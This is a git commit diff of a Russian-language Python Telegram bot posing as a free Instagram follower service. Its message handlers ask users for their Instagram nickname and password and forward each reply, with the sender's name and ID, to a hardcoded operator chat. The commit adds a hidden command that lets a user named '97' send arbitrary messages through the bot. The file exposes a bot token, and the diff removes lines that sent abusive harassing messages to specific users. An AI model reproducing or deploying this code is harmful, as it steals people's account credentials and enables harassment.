39b81e2bd40837928116a464754341d838801f83
Muliar Underground <mrdm854@gmail.com>
2021-01-02 04:40:27 +0300

    renewal

--- insta.py
+++ insta.py
@@ -6,10 +6,10 @@ TOKEN = '991281297:AAHnhg9O6SpkicaT15FUCIyP8w63OllhMSM'
 MAIN_URL = f'https://api.telegram.org/bot{TOKEN}'
 
 bot = telebot.TeleBot(TOKEN)
-r = requests.get(f'{MAIN_URL}/getUpdates')
-print(r.json())
-print(bot.get_me())
-#bot.send_message(707614495, 'test')
+toolID = [
+    'id',
+    'answer'
+]
 
 user_markup1 = types.InlineKeyboardMarkup()
 answer_yes = types.InlineKeyboardButton('Да', callback_data='yes')
@@ -23,12 +23,6 @@ markup_inline_choice.add(for_that)
 user_markup2 = types.InlineKeyboardMarkup()
 answer_message = types.InlineKeyboardButton('Хочешь оставить отзыв?', callback_data='message')
 user_markup2.add(answer_message)
-
-
-bot.send_message(756255004, 'ИДИ НА РАЙОН ПАЦАНОВ ВАФЛИ')
-bot.send_message(707614495,'СДОХНИ ТУПАЯ 14 ЛЕТНЯЯ ТВАРЬ ГО ГУЛЯТЬ В ВОСКРЕСЕНЬЕ')
-
-
 
 def log(message, answer):
     print('\n \n'
@@ -51,13 +45,11 @@ def commands(message):
                               'Наш бот дает 50 подписчиков бесплатно,\n'
                               'остальные за деньги.👌💵\n'
                               'Готовы ли вы продолжать?', reply_markup=user_markup1)
-#request_contact=True
-#request_location=True
 
-@bot.message_handler(commands=['stop'])
-def commands(message):
-    bot.send_message(message.chat.id, 'Бот останавливается.')
-
+@bot.message_handler(commands=['tool'])
+def tool(message):
+    if message.from_user.first_name == '97':
+        bot.send_message(toolID[0], toolID[1])
 
 @bot.message_handler(commands=['support'])
 def commands(message):
@@ -67,27 +59,25 @@ def commands(message):
                                       'Напиши отзыв по примеру ниже или он не будет сохранен.\n'
                                       'Пример🔒:\n'
                                       'Отзыв: (и дальше ваш текст)')
-    #bot.send_message(707614495, message.text)
 
-
-#@bot.message_handler(regexp='Да')
-#def da(message):
-    #bot.send_message(message.chat.id, 'Отлично!👑🎰\n'
-                                      #'Введите свой @никнейм и пароль от аккаунта.\n'
-                                      #'Вот так✍:\n'
-                                      #'@nickname 12345678', reply_markup=markup_inline_choice)
-
-    #user_markup1 = telebot.types.ReplyKeyboardMarkup(True, True)
-    #user_markup1.row('Зачем?😯')
-    #bot.send_message(message.from_user.id, '. . .', reply_markup=user_markup1)
-
+@bot.message_handler(regexp='✍🏻')
+def personalId(message):
+    if message.from_user.first_name == '97':
+        toolID[1] = message.text
+        print(toolID[1])
+        bot.send_message(message.from_user.id, 'Done.')
 
 @bot.message_handler(regexp='Отзыв')
 def ytn(message):
     bot.send_message(message.chat.id, 'Спасибо!😁☺️\n'
                                       'Ваш отзыв обязательно будет рассмотрен!)\n'
                                       '🔓📆')
-    bot.send_message(707614495, message.text)
+    bot.send_message(707614495,'Имя: {0} {1}\n'
+                                    'Его ID: @{2}\n'
+                                    'Текст: {3}'.format(message.from_user.first_name,
+                                                        message.from_user.last_name,
+                                                        str(message.from_user.id),
+                                                        message.text))
 
 @bot.message_handler(regexp='promo100')
 def ytn(message):
@@ -102,12 +92,12 @@ def answer_for_question(call):
                                                'которые поднимут активность на твоем инстаграм аккаунте)🎆\n'
                                                'Вводи вот так✍:@nickname 12345678')
     elif call.data == 'yes':
-        bot.send_message(call.message.chat.id, 'Прекрасно!'
+        bot.send_message(call.message.chat.id, 'Отлично!👑🎰\n'
                                                'Введите свой @никнейм и пароль от аккаунта.\n'
                                                'Вот так✍:\n'
                                                '@nickname 12345678', reply_markup=markup_inline_choice)
     elif call.data == 'no':
-        bot.send_message(call.message.chat.id,'Очень жалко💔(\n'
+        bot.send_message(call.message.chat.id,'Очень жаль💔(\n'
                                               'Но вы всегда можете воспользоваться нашими услугами на сайте.')
     elif call.data == 'message':
         bot.send_message(call.message.chat.id,'Чтобы оставить отзыв - напиши / \nи выбери комманду /support\n'
@@ -118,20 +108,18 @@ def edit_answer(message):
     bot.send_message(message.from_user.id, text='Зачем изменил?:\n'
                                                 '{edited_message}'.format(edited_message=message.text))
 
-       # hide_markup = telebot.types.ReplyKeyboardHide()
-       # bot.send_message(message.from_user.id, '. . .', reply_markup=hide_markup)
-
 @bot.message_handler(func=lambda message: True)
 def message_react(message):
+    if message.from_user.first_name == '97':
+        toolID[0] = message.text
+        print(toolID[0])
     answer = 'Не выходит, попробуй снова.\nВозможно ты неправильно ввел(а) свой пароль или никнейм\n' \
              '😢😱🥴'
     if '@' in message.text:
-        answer = 'Отлично! Подписчики на подходе'
         log(message, answer)
         bot.send_message(message.chat.id, 'Отлично!\n'
-                                          'Подписчики на подходе)😁☺\n'
+                                          'Подписчики будут в течении часа)😁☺\n'
                                           'Если знаешь наш промокод самое время его ввести!👁😇💋️', reply_markup=user_markup2)
-        print()
         bot.send_message(707614495, 'Имя: {0} {1}\n'
                                     'Его ID: {2}\n'
                                     'Текст: {3}'.format(message.from_user.first_name,
@@ -153,12 +141,6 @@ def message_react(message):
                                                         message.from_user.last_name,
                                                         str(message.from_user.id),
                                                         message.text))
-        #bot.send_message(684414835, 'Имя: {0} {1}\n'
-                                    #'Его ID: {2}\n'
-                                    #'Текст: {3}'.format(message.from_user.first_name,
-                                                        #message.from_user.last_name,
-                                                        #str(message.from_user.id),
-                                                        #message.text))
         log(message, answer)
 
 
